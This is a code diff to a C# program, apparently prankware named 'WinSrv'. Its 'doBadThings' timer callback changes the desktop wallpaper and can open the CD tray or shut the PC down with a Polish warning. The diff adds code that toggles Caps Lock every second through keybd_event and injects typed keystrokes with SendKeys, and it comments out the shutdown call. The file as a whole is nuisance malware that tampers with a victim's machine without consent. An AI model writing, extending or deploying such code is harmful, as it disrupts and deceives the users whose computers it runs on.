@@ -6,6 +6,8 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Timers;
+using System.Windows.Forms;
 using Microsoft.Win32;
 
 namespace WinSrv
@@ -21,6 +23,9 @@ namespace WinSrv
         private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
         private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
         private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
+
+        [DllImport("user32.dll")]
+        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
 
         public static int openCD()
         {
@@ -65,7 +70,7 @@ namespace WinSrv
                 }
                 else
                 {
-                    Timer My_Timer = new System.Threading.Timer(doBadThings, null, milsec, 0);
+                    System.Threading.Timer My_Timer = new System.Threading.Timer(doBadThings, null, milsec, 0);
                 }
                 
             }
@@ -102,9 +107,67 @@ namespace WinSrv
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
 
+        public static void switchCapsLock()
+        {
+            try
+            {
+                const int KEYEVENTF_EXTENDEDKEY = 0x1;
+                const int KEYEVENTF_KEYUP = 0x2;
+                keybd_event(0x14, 0x45, KEYEVENTF_EXTENDEDKEY, (UIntPtr)0);
+                keybd_event(0x14, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,
+                (UIntPtr)0);
+            }
+            catch
+            {
+
+            }
+        }
+
+        public static bool checkCapsLockState()
+        {
+            if (Console.CapsLock) // Checks Capslock is on
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        public static void switchCapsLock(object source, ElapsedEventArgs e)
+        {
+            switchCapsLock();
+        }
+
+        public static void CapsLockSweep()
+        {
+
+            System.Timers.Timer myTimer = new System.Timers.Timer();
+            myTimer.Elapsed += new ElapsedEventHandler(switchCapsLock);
+            myTimer.Interval = 1000; // 1000 ms is one second
+            myTimer.Start();
+        }
+
+        public static void WriteWord()
+        {
+            string a = "test";
+            foreach (char c in a)
+            {
+                System.Threading.Thread.Sleep(100);
+                SendKeys.Send(c.ToString()); //Do poprawy windows forms
+            }
+
+        }
+
         static void doBadThings(object state)
         {
-            shutdown(60, "Komputer zostanie wyłączony!");
+            //switchCapsLock();
+            CapsLockSweep();
+
+            WriteWord();
+
+            //shutdown(60, "Komputer zostanie wyłączony!");
 
             string imgWallpaper = Path.GetFullPath(@"Wallpaper.jpg");
             
